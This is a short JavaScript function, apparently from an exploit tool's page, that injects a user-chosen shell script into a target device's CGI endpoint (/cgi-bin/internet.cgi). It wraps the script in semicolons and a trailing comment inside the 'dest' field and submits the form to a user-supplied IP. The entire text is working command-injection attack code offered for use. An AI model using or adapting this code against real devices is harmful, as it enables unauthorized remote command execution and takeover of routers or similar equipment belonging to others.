function inject() {
    var userresp = confirm('Are you really want to inject this shell script? THIS CANNOT BE UNDONE!');

    if (userresp) {
        var script = document.getElementById('payload').value;
        var targetip = document.getElementById('targetip').value;
        var elem = document.getElementById('dest');
        var form = document.getElementById('exploiter');

        elem.value = ';' + script + '; #';
        form.action = 'http://' + targetip + '/cgi-bin/internet.cgi';
        form.submit();

        alert("Let the Magic happen...");
    }
}
